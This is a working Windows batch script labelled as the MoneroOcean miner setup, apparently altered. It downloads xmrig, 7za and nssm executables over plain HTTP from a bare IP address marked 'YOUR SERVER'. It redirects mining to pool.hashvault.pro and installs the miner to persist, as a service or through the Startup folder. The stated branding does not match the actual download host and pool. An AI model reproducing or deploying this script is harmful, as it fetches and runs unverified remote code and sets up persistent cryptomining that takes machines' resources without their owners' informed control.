@echo off

set VERSION=2.5

rem printing greetings
echo MoneroOcean mining setup script v%VERSION%.
echo ^(please report issues to support@moneroocean.stream email^)
echo.

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

rem command line arguments
set WALLET=%1
rem this one is optional
set EMAIL=%2

rem checking prerequisites
if [%WALLET%] == [] (
  echo Script usage:
  echo ^> setup_moneroocean_miner.bat ^<wallet address^> [^<your email address^>]
  echo ERROR: Please specify your wallet address
  exit /b 1
)

for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
echo ERROR: Wrong wallet address length (should be 106 or 95): %WALLET_BASE_LEN%
exit /b 1

:WALLET_LEN_OK

if ["%USERPROFILE%"] == [""] (
  echo ERROR: Please define USERPROFILE environment variable to your user directory
  exit /b 1
)

if not exist "%USERPROFILE%" (
  echo ERROR: Please make sure user directory %USERPROFILE% exists
  exit /b 1
)

where powershell >NUL || (echo ERROR: powershell missing & exit /b 1)
where find >NUL || (echo ERROR: find missing & exit /b 1)
where findstr >NUL || (echo ERROR: findstr missing & exit /b 1)
where tasklist >NUL || (echo ERROR: tasklist missing & exit /b 1)

if %ADMIN% == 1 (
  where sc >NUL || (echo ERROR: sc missing & exit /b 1)
)

rem calculating port
set /a "EXP_MONERO_HASHRATE = %NUMBER_OF_PROCESSORS% * 700 / 1000"
if [%EXP_MONERO_HASHRATE%] == [] (echo ERROR: Can't compute projected Monero hashrate & exit)

if %EXP_MONERO_HASHRATE% gtr 8192 ( set PORT=18192 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 4096 ( set PORT=14096 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 2048 ( set PORT=12048 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 1024 ( set PORT=11024 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  512 ( set PORT=10512 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  256 ( set PORT=10256 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  128 ( set PORT=10128 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   64 ( set PORT=10064 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   32 ( set PORT=10032 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   16 ( set PORT=10016 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    8 ( set PORT=10008 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    4 ( set PORT=10004 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    2 ( set PORT=10002 & goto PORT_OK )
set PORT=10001
:PORT_OK

rem printing intentions
set "LOGFILE=%USERPROFILE%\moneroocean\xmrig.log"
echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
echo Mining will happen to %WALLET% wallet.

if not [%EMAIL%] == [] (
  echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
)
echo.

if %ADMIN% == 0 (
  echo Since no admin access, mining will be started from startup folder.
) else (
  echo Mining in background will be performed using moneroocean_miner service.
)
echo.

pause

rem clean old
sc stop moneroocean_miner
sc delete moneroocean_miner
taskkill /f /t /im xmrig.exe
:REMOVE_DIR0
rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR0

rem === DOWNLOAD FROM YOUR SERVER ===
echo [*] Downloading xmrig.zip
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://210.105.183.81:8080/xmrig.zip', '%USERPROFILE%\xmrig.zip')"

echo [*] Unpacking xmrig.zip
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\moneroocean')" || (
  echo [*] Downloading 7za.exe
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://210.105.183.81:8080/7za.exe', '%USERPROFILE%\7za.exe')"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\xmrig.zip"
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"

rem test miner
"%USERPROFILE%\moneroocean\xmrig.exe" --help >NUL || (
  echo ERROR: xmrig not functional
  exit /b 1
)

echo [*] Miner OK

rem prepare config
for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
if [%PASS%] == [] ( set PASS=na )
if not [%EMAIL%] == [] ( set "PASS=%PASS%:%EMAIL%" )

powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"pool.hashvault.pro:443\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'"
powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'"
powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'"

copy /Y "%USERPROFILE%\moneroocean\config.json" "%USERPROFILE%\moneroocean\config_background.json"
powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config_background.json'"

rem === RUN BACKGROUND ===
if %ADMIN% == 1 (
  echo [*] Downloading nssm.zip
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://210.105.183.81:8080/nssm.zip', '%USERPROFILE%\nssm.zip')"
  powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\moneroocean')" || (
    powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://210.105.183.81:8080/7za.exe', '%USERPROFILE%\7za.exe')"
    "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\nssm.zip"
    del "%USERPROFILE%\7za.exe"
  )
  del "%USERPROFILE%\nssm.zip"

  sc stop moneroocean_miner
  sc delete moneroocean_miner
  "%USERPROFILE%\moneroocean\nssm.exe" install moneroocean_miner "%USERPROFILE%\moneroocean\xmrig.exe"
  "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppDirectory "%USERPROFILE%\moneroocean"
  "%USERPROFILE%\moneroocean\nssm.exe" start moneroocean_miner
) else (
  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  echo "%USERPROFILE%\moneroocean\xmrig.exe" --config="%USERPROFILE%\moneroocean\config_background.json" > "%STARTUP_DIR%\moneroocean_miner.bat"
  call "%STARTUP_DIR%\moneroocean_miner.bat"
)

echo [*] Setup complete
pause
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b
